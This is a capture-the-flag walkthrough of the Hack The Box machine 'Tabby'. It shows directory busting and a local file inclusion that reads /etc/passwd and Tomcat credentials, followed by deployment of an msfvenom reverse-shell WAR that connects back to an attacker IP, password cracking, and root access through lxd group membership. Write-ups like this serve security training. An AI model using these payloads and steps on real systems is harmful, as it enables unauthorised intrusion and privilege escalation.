# Tabby

## Enumeration

```
rustscan -a 10.129.5.1 --ulimit 5000 -- -A
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*6tAbjag5I1UqfYpfvLKGJA.png" alt="" height="477" width="700"><figcaption></figcaption></figure>

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*u_o1yfghlEgqdbndnpGdhw.png" alt="" height="411" width="700"><figcaption></figcaption></figure>

Add tabby.htb to your /etc/hosts. Let’s run ffuf for directory busting:

```
ffuf -w '/usr/share/wordlists/dirb/common.txt' -u '
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*f3VP0gR9d31xzbYLgMixCQ.png" alt="" height="180" width="700"><figcaption></figcaption></figure>

We have a webserver on 8080 as well:

```
ffuf -w '/usr/share/wordlists/dirb/common.txt' -u '
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*WrFXU6T_KxXpaQsoT1l2Kg.png" alt="" height="145" width="700"><figcaption></figcaption></figure>

Let’s visit the website on port 80:

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*TuPvst2NG-matKdnnnfUdw.png" alt="" height="326" width="700"><figcaption></figcaption></figure>

In the bottom of the page, we find an e-mail: **sales@megahosting.htb**, which gives us a domain: **megahosting.htb**. Add that to your /etc/hosts. Opening the website, we get the same page as this, and the same resulting with ffuf as well :-(

## Initial Foot Hold

\
In the main page, we find a link: **Read our statement…**\
Clicking that, redirects us to: [http://megahosting.htb/news.php?file=statement](http://megahosting.htb/news.php?file=statement)\
I tried LFI here:\
[http://megahosting.htb/news.php?file=../../../../etc/passwd](http://megahosting.htb/news.php?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd):

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*DXAQJyl_TI7ld1LnIl3OHQ.png" alt="" height="141" width="700"><figcaption></figcaption></figure>

And it worked! We get the user as: **ash**\
I tried various directories for getting the conf file, finally I found one here:\
[http://megahosting.htb/news.php?file=../../../../../usr/share/tomcat9/etc/tomcat-users.xml](http://megahosting.htb/news.php?file=..%2F..%2F..%2F..%2F..%2Fusr%2Fshare%2Ftomcat9%2Fetc%2Ftomcat-users.xml)\
Checking the source code:

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*y5eMHxOm-EfsyxspGY-s8Q.png" alt="" height="167" width="700"><figcaption></figcaption></figure>

Username: **tomcat**\
Password: **$3cureP4s5w0rd123!**

Go to [http://tabby.htb:8080/host-manager/html](http://tabby.htb:8080/host-manager/html). Login using the credentials above.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*ioNparlsRId8XGz5GejJYA.png" alt="" height="323" width="700"><figcaption></figcaption></figure>

I created a war file exploit using:

```
msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.42 LPORT=1234 -f war > shell.war
```

Now, let’s try to upload the file using curl:

```
curl -T shell.war -u 'tomcat':'$3cureP4s5w0rd123!' 'http://tabby.htb:8080/manager/text/deploy?path=/myapp'
```

It was succesfull! Now, I set up a nc listener and browsed to:\
[http://tabby.htb:8080/myapp/shell.war](http://tabby.htb:8080/myapp/shell.war)

<figure><img src="https://miro.medium.com/v2/resize:fit:605/1*eodsoXAMRlKBTbKgznjW2w.png" alt="" height="172" width="605"><figcaption></figcaption></figure>

And I got the shell! Let’s stabilise it using [socat](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/).

Now, time for privilege escalation! I ran [linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS). I find this file:\
/var/www/html/files/16162020\_backup.zip I downloaded this to my machine and cracked the password using john. I got this password: **admin@it**

I didn’t find anything useful in the zip, but surprisingly, this is also the password of **ash**:

```
su ash
```

## Priv Esc

## lxd

I ran **id** and found this:

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*cudnzi98pIDz8SdmPk3cRw.png" alt="" height="64" width="700"><figcaption></figcaption></figure>

We are in the **lxd** group. This article will be helpful:

[Lxd Privilege EscalationIn this post we are going to describes how an account on the system that is a member of the lxd group is able to…www.hackingarticles.in](https://www.hackingarticles.in/lxd-privilege-escalation/?source=post\_page-----67d56026282c--------------------------------)

First, clone this [repo](https://github.com/saghul/lxd-alpine-builder) and run **build-alpine**. Then transfer the tar.gz file to the victim machine. Then run the following commands:

```
lxc image import ./alpine-v3.14-x86_64-20210809_0302.tar.gz
```

**F.** I forgot to add the alias. Nvm, run this command:

```
lxc image list
```

Here, we see its fingerprint. Delete this image using:

```
lxc image delete fdf378551f70
```

Now, let’s try again:

```
lxc image import ./alpine-v3.14-x86_64-20210809_0302.tar.gz --alias myimagelxc init myimage ignite -c security.privileged=true
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*8RfwEtfGdik77fc890fg8w.png" alt="" height="119" width="700"><figcaption></figcaption></figure>

I got this error. Run:

```
lxd init
```

Leave everything as default. Then run:

```
lxc init myimage ignite -c security.privileged=truelxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=truelxc start ignitelxc exec ignite /bin/sh
```

<figure><img src="https://miro.medium.com/v2/resize:fit:478/1*gm6TplNvM6HWwjrvEjnI1Q.png" alt="" height="142" width="478"><figcaption></figcaption></figure>

And we are root!\
Get **user.txt** from **/mnt/root/home/ash/user.txt** and **root.txt** from **/mnt/root/root/root.txt**.

**We have successfully pwned the box!**
